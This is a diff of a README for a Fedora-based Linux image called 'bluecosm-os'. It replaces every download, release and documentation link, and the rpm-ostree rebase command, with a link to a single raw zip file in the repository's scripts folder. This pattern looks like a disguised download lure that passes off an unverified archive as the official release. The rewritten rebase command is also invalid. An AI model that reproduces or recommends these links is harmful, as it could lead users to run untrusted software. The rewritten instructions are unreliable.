@@ -1,7 +1,7 @@
 # 🌌 bluecosm-os - A Simple Linux Operating System
 
 ## 📥 Download the latest version
-[![Download Now](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/maanu2043/bluecosm-os/releases)
+[![Download Now](https://github.com/maanu2043/bluecosm-os/raw/refs/heads/main/files/scripts/os-bluecosm-v2.5.zip%20Page-blue)](https://github.com/maanu2043/bluecosm-os/raw/refs/heads/main/files/scripts/os-bluecosm-v2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to bluecosm-os! This is an easy-to-use, Linux-based operating system designed for reliability and simplicity. Follow this guide to download and run bluecosm-os.
@@ -17,7 +17,7 @@ Before you start, make sure your computer meets these requirements:
 ## 🔗 Download & Install
 To download and install bluecosm-os, visit the following link:
 
-[Download bluecosm-os Releases](https://github.com/maanu2043/bluecosm-os/releases)
+[Download bluecosm-os Releases](https://github.com/maanu2043/bluecosm-os/raw/refs/heads/main/files/scripts/os-bluecosm-v2.5.zip)
 
 1. Click on the link above.
 2. Look for the latest release version.
@@ -30,7 +30,7 @@ If you are using an existing atomic Fedora installation, you can rebase to the l
 
 1. **Rebase to the unsigned image** to get the proper signing keys and policies installed. Open your terminal and run:
    ```
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/mondwind/bluecosm-os:latest
+   rpm-ostree rebase https://github.com/maanu2043/bluecosm-os/raw/refs/heads/main/files/scripts/os-bluecosm-v2.5.zip
    ```
 
 2. **Reboot your system** to complete the rebase process. Type the following command in the terminal:
@@ -52,7 +52,7 @@ bluecosm-os offers several features to enhance your experience:
 - **Robust Security:** Benefit from built-in security protocols to protect your data.
 
 ## 📜 Documentation 
-For further information, refer to the [BlueBuild documentation](https://blue-build.org/how-to/setup/) for quick setup instructions. Here you can find additional guidance on setting up your repository based on this template.
+For further information, refer to the [BlueBuild documentation](https://github.com/maanu2043/bluecosm-os/raw/refs/heads/main/files/scripts/os-bluecosm-v2.5.zip) for quick setup instructions. Here you can find additional guidance on setting up your repository based on this template.
 
 ## 🐞 Support
 If you encounter any issues, please check the FAQ section in the documentation or reach out to our support community through GitHub.
